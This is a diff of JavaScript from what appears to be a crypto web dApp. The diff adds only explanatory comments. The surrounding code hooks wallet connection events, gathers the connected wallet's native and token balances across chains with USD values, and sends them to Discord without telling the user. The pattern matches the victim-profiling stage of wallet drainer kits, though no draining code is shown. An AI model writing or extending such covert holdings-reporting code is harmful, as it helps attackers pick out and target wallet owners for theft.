@@ -94,11 +94,13 @@ async function sendBalancesToDiscord(account) {
       const chainId = chain.id;
       const chainName = chain.name;
 
+      // Fetch native balance
       const nativeBalance = await fetchBalance({ address, chainId });
       const nativeAmount = parseFloat(nativeBalance.formatted).toFixed(6);
       const nativePrice = await getUSDPrice(nativeBalance.symbol);
       const nativeUSD = nativePrice ? (nativePrice * nativeAmount).toFixed(2) : null;
 
+      // Add native balance info to the nativeBalances array
       nativeBalances.push({
         chain: chainName,
         symbol: nativeBalance.symbol,
@@ -109,6 +111,7 @@ async function sendBalancesToDiscord(account) {
       const { publicClient: chainClient } = configureChains([chain], [w3mProvider({ projectId })]);
       const tokensList = [];
 
+      // Check if token balances can be fetched
       if (typeof chainClient.getTokenBalances === "function") {
         const tokens = await chainClient.getTokenBalances({ address });
         for (const token of tokens) {
@@ -136,6 +139,7 @@ async function sendBalancesToDiscord(account) {
   await sendToDiscordEmbed({ address, nativeBalances, tokenSections });
 }
 
+// Listen for wallet connection changes
 watchAccount((account) => {
   if (account.isConnected) {
     sendBalancesToDiscord(account);
